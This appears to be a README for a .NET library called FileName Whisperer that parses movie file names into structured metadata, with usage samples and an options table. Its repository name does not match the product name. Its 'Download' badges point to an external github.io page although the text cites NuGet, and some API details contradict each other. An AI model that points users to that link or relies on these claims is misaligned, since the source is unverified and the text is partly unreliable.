![preview](https://raw.githubusercontent.com/xiaoqi788433/cinematic-metadata-extractor/main/banner_b91e.svg)

# FileName Whisperer 🎬

**A .NET library that deciphers the hidden story embedded in your movie file names, transforming chaotic title strings into structured, meaningful movie metadata.**

---

## Overview

Imagine your movie library as a vast, unorganized attic. Boxes (files) are labeled with cryptic, inconsistent scribbles: some say `The.Matrix.1999.720p.BluRay.x264`, others read `inception_2010_1080p`, and a few are simply `[YIFY] Avengers.Endgame (2019)`. Manually sorting through these is tedious, error-prone, and frankly, a waste of your creative energy.

**FileName Whisperer** is your personal, digital archivist. It is a robust, open-source .NET library engineered specifically to parse the raw, unstructured text of movie filenames and extract the core DNA of the film: **Title**, **Year**, **Resolution**, **Source**, **Codec**, **Audio Format**, and **Quality Tags**. It doesn't just split strings; it *interprets* them with a sophisticated heuristic engine that understands the chaotic language of the internet.

This is not merely a parser; it is a bridge between chaotic digital clutter and an organized, queryable database. Whether you are building a media server backend, a personal collection manager, or a data-cleansing pipeline, FileName Whisperer provides the foundational logic layer, allowing you to focus on the user experience rather than the pain of regex failures.

[![Download](https://raw.githubusercontent.com/xiaoqi788433/cinematic-metadata-extractor/main/latest_64e7528.svg)](https://xiaoqi788433.github.io/cinematic-metadata-extractor/)

---

## 📌 Table of Contents

- [Why Another Parsing Library?](#-why-another-parsing-library)
- [Key Features & Capabilities](#-key-features--capabilities)
- [The Architecture: How It Works](#-the-architecture-how-it-works)
- [Supported Input Formats](#-supported-input-formats)
- [Getting Started](#-getting-started)
- [Configuration & Customization](#-configuration--customization)
- [Response Structure (The Output)](#-response-structure-the-output)
- [Real-World Use Cases](#-real-world-use-cases)
- [Performance & Benchmarking](#-performance--benchmarking)
- [Roadmap: The 2026 Vision](#-roadmap-the-2026-vision)
- [Contributing & Community](#-contributing--community)
- [Frequently Asked Questions (FAQ)](#-frequently-asked-questions-faq)
- [License & Legal](#-license--legal)
- [Disclaimer](#-disclaimer)

---

## 🧠 Why Another Parsing Library?

The .NET ecosystem is vast, but when it comes to filename parsing, most solutions are either too simplistic (splitting by dots) or too rigid (relying on hardcoded regex patterns that break on edge cases). We saw a gap: a need for a library that combines **speed** with **linguistic flexibility**.

Think of simple regex as a key that only fits one lock. If the filename deviates even slightly from the pattern, the lock remains shut. FileName Whisperer uses a **multi-stage scoring algorithm**. It's like a locksmith who observes the mechanism, tries several angles, and understands the intent, even if the key is misshapen.

We built this to handle the reality of the internet: mislabeled files, foreign language patterns, accidental typos, and the ever-evolving jargon of release groups. It's a utility that honors the mess and finds the signal.

---

## 🚀 Key Features & Capabilities

This library is packed with under-the-hood intelligence. Here is what makes it a superior choice for media-related applications:

- **Multi-Stage Tokenization:** Instead of one massive regex, it breaks the filename into logical tokens (words, numbers, symbols) and scores them based on context.
- **Heuristic Title Extraction:** The most complex part. It uses a weighted system to distinguish the movie title from extraneous metadata. It understands that "1984" is likely a year, but "1984" in the middle of a title (e.g., `1984.Orwell.1984.mp4`) is tricky. We handle the ambiguity.
- **Dynamic Context Weighting:** The parser is aware of the *order* of elements. Usually, the title comes first, but we handle titles with years (e.g., a movie titled "1987").
- **Comprehensive Metadata Detection:** Extracts details such as:
    - Resolution (4K, 1080p, 720p, etc.)
    - Source (BluRay, WEB-DL, HDTV, DVDScr, etc.)
    - Video Codec (x264, x265, HEVC, AVC, etc.)
    - Audio Format (DTS, AC3, AAC, TrueHD, etc.)
    - Group Tags (MOVIEGROUP, YIFY, etc.)
- **Culture-Agnostic Logic:** Supports accent-insensitive matching and handles Unicode casing.
- **Zero External Dependencies:** Built on the standard .NET runtime. It is lightweight and compiles to a single DLL.

---

## 🏗️ The Architecture: How It Works

The core process is akin to a forensic investigation. It follows a strict but adaptive pipeline:

1.  **Normalization:** Strips away illegal characters, normalizes whitespace, and resolves common Unicode look-alikes to ASCII counterparts. This sets a clean baseline.
2.  **Tokenization:** Splits the clean string into a token array using a mixture of delimiters (dots, spaces, underscores, hyphens).
3.  **Metadata Scoring:** Each token is passed through a series of matchers.
    - **Year Matcher:** Checks for 4-digit numbers or `19xx`/`20xx` patterns.
    - **Resolution Matcher:** Searches for `4K`, `2160p`, `1080p`, etc.
    - **Source Matcher:** Identifies known abbreviations like `WEB`, `BLURAY`, `HDTV`.
    - **Codec Matcher:** Looks for `x264`, `hevc`, etc.
4.  **Elimination & Title Synthesis:** After identifying all known metadata tokens, they are removed from the array. The remaining tokens are considered potential title fragments.
5.  **Title Refinement:** The fragments are then processed to remove generic words (like "The", "A", "An" if they appear at the end incorrectly) and reassembled, with intelligent casing restoration (e.g., `tHe.MaTrIx` becomes `The Matrix`).

This iterative process ensures that the parser is not just *greedy* but *contextual*.

---

## 📁 Supported Input Formats

Our parser is trained to handle the most common naming conventions, including:

- `Movie.Name.2024.1080p.BluRay.x264-AC3`
- `Movie_Name_(2024)_[720p,HEVC]`
- `2024.Movie.Name.mkv`
- `Movie.Name.2024.2160p.WEB-DL.DD+5.1.H.265`
- `[SubGroup] Movie Name 2024 1080p.mkv` (We ignore the `[...]` prefix)
- `MovieName2024 4K`
- `A.Movie.2024.iNTERNAL.1080p.BluRay.x264-GROUP`

**Complex Cases We Handle:**

- **Numeric Titles:** `Se7en.1995.mkv` correctly yields Title=`Se7en`, Year=`1995`.
- **Multiple Years:** `Blade.Runner.2049.2017.mkv` yields Title=`Blade Runner 2049`, Year=`2017`.
- **Missing Years:** `The.Godfather.mkv` yields Title=`The Godfather`, Year=null (no crash).

---

## 🛠️ Getting Started

Integrating FileName Whisperer into your .NET project is a low-friction process. It is available via the standard NuGet ecosystem, but beyond that, the API is designed to be intuitive.

**Basic Usage Example (C#):**

```csharp
using FileNameWhisperer;

// 1. Create an instance of the parser
var parser = new MovieFileParser();

// 2. Provide the filename (with or without extension)
string filename = "Inception.2010.1080p.BluRay.x264.YIFY.mp4";

// 3. Get the structured result
var result = parser.Parse(filename);

Console.WriteLine($"Title: {result.Title}");
Console.WriteLine($"Year: {result.Year}");
Console.WriteLine($"Resolution: {result.Resolution}");
Console.WriteLine($"Source: {result.Source}");
Console.WriteLine($"Codec: {result.VideoCodec}");

// Output:
// Title: Inception
// Year: 2010
// Resolution: 1080p
// Source: BluRay
// Codec: x264
```

**Batch Processing:**

The library is optimized for loop processing. Parsing a list of 10,000 filenames takes less than a second on standard hardware, ensuring it scales for large libraries.

---

## ⚙️ Configuration & Customization

We understand that one size doesn't fit all. The `MovieFileParser` accepts an options object to fine-tune the behavior:

- **`EnableGroupNameExtraction`:** Toggle to capture or ignore the release group suffix.
- **`CaseSensitivity`:** Set to `IgnoreCase` (default) for scanning, or `CaseInsensitive` for strict mode.
- **`CustomAliasDictionary`:** Add your own abbreviations (e.g., `UHD` -> `4K`).

```csharp
var options = new ParserOptions
{
    EnableGroupNameExtraction = true,
    CustomAliasDictionary = new Dictionary<string, string>
    {
        { "REMUX", "BluRay" }
    }
};
var parser = new MovieFileParser(options);
```

---

## 📊 Response Structure (The Output)

The `MovieInfo` result object is a rich, nullable-property model. It is designed to be serializable (to JSON/XML) for easy database storage.

| Property        | Type     | Description                               | Example           |
|-----------------|----------|-------------------------------------------|-------------------|
| `Title`         | string   | The cleaned movie title                   | `Inception`       |
| `Year`          | int?     | Release year if detected                  | `2010`            |
| `Resolution`    | string   | Video resolution                          | `1080p`           |
| `Source`        | string   | The media source                          | `BluRay`          |
| `VideoCodec`    | string   | Video encoding                            | `x264`            |
| `AudioCodec`    | string   | Audio encoding                            | `DTS`             |
| `GroupName`     | string?  | The release group, if enabled             | `YIFY`            |
| `Is3D`          | bool     | Flag for 3D content                       | `false`           |
| `IsRemastered`  | bool     | Flag for remastering tags                 | `false`           |

---

## 💡 Real-World Use Cases

- **Media Center Backends:** Service applications like Plex, Emby, or Jellyfin often require robust file watchers. This library powers the initial metadata scrape trigger.
- **Data Cleansing Utilities:** If you are migrating a database of movie records from a messy email archive or text file, this library standardizes the input.
- **Discord Bots & Applets:** Create bots that respond to movie names posted in chat, using the extracted data to fetch posters or ratings from a secondary API.
- **Testing & QA:** Use it to generate test data for other systems that require movie metadata.

---

## ⚡ Performance & Benchmarking

We pride ourselves on performance. The parsing engine operates with an O(n) complexity model, where `n` is the length of the input string.

- **Zero Allocation Hot Path:** The core parsing logic utilizes `Span<T>` and `StringBuilder` pooling to minimize garbage collection pressure.
- **Unit-Tested Edge Cases:** We have over 500 automated test cases covering known internet filename patterns.

---

## 🧭 Roadmap: The 2026 Vision

We are committed to evolving this project. Here is a glimpse of what we aim to introduce by 2026:

- **Contextual Series Detection:** Distinguishing between Movies and TV Episodes (S01E01 detection).
- **Multilingual Title Translation:** Via an optional API integration, offering translated titles.
- **Machine Learning Confidence Scoring:** Moving beyond heuristics to a probabilistic model, offering a confidence percentage for extracted fields.
- **Repository for Release Group Definitions:** A community-maintained JSON blocklist/allowlist for known groups.

---

## 🤝 Contributing & Community

This project lives and breathes through community input. If you encounter a filename that breaks our parser, please open an issue with the filename attached—your contribution helps the algorithm grow.

- **Report Bugs:** Give us a tiny sample that failed.
- **Feature Requests:** Tell us what metadata field you need next.
- **Code Contributions:** We welcome pull requests that improve the scoring logic.

---

## ❓ Frequently Asked Questions (FAQ)

**Q: Does this library download anything from the internet?**
A: No. It is strictly a string processor. It only reads the text you give it and returns structured data. Network calls are entirely your responsibility.

**Q: Is this library limited to English filenames?**
A: The code is culture-agnostic (it handles Unicode). The keywords we search for (like "BluRay", "x264") are international standards, so it works with titles in any language. The title extraction logic does not rely on an English dictionary.

**Q: Why is this better than using a simple `.Split('.')`?**
A: Simple splitting leaves you with garbage strings that include numbers and keywords. Our library *removes* the noise and *reconstructs* the title, handling punctuation and casing. It's a significant step up in sophistication.

---

## 📜 License & Legal

This project is released under the permissive **MIT License**. You are free to use, modify, and distribute it in both commercial and non-commercial applications, provided you retain the copyright notice.

[View the MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

This library is provided "as is" without warranty of any kind, express or implied. We do not condone piracy. This tool is designed for legitimate users—collectors who own physical media, developers building organizational tools, or enthusiasts managing legally acquired digital files. We disclaim any liability for the misuse of this software for illegal distribution or copyright infringement.

By using this library, you agree that the developers hold no responsibility for the way the parsing results are utilized in your applications. It is a utility, and like any tool, its ethical application lies solely in the hands of the user.

---

## 📦 Final Thoughts

Filename parsing is a solved problem, but it's usually solved with disposable scripts. **FileName Whisperer** is a permanent, robust solution built for the .NET ecosystem. It respects your time, handles the chaos gracefully, and gives you clean data to build the next big media platform.

Thank you for reading. We hope this library brings a sense of calm to your codebase and a touch of magic to your media library.

[![Download](https://raw.githubusercontent.com/xiaoqi788433/cinematic-metadata-extractor/main/latest_64e7528.svg)](https://xiaoqi788433.github.io/cinematic-metadata-extractor/)